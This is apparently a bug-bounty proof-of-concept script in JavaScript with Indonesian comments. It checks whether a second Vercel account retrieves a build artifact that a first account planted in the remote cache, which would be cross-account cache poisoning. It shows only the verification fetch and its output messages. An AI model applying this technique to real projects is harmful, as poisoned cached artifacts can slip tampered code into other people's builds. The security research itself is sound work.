const { VERCEL_ARTIFACTS_TOKEN, VERCEL_ARTIFACTS_ID } = process.env;

async function verify() {
    console.log("[#] === VERCEL INTEGRITY VERIFICATION ===");
    
    // Hash yang sama dengan yang di-upload Akun A
    const artifactHash = "h1_poc_3v1rn_999"; 
    const url = `https://api.vercel.com/v8/artifacts/${artifactHash}`;

    console.log(`[*] Attempting to fetch poisoned artifact: ${artifactHash}`);

    try {
        const res = await fetch(url, {
            method: 'GET',
            headers: {
                // Pakai token asli Akun B (Legal)
                'Authorization': `Bearer ${VERCEL_ARTIFACTS_TOKEN}`
            }
        });

        console.log(`[?] Status Code: ${res.status}`);

        if (res.status === 200) {
            const content = await res.text();
            console.log("\n[🚨][🚨][🚨] BUKTI TELAK BERHASIL!");
            console.log(`[!] Content Found: "${content}"`);
            console.log("[!] Project B beneran narik file yang di-inject Akun A.");
        } else {
            console.log(`[-] Gagal. Status: ${res.status}. Berarti cuma 202 palsu.`);
        }
    } catch (e) {
        console.log(`[!] Error: ${e.message}`);
    }
}

verify();
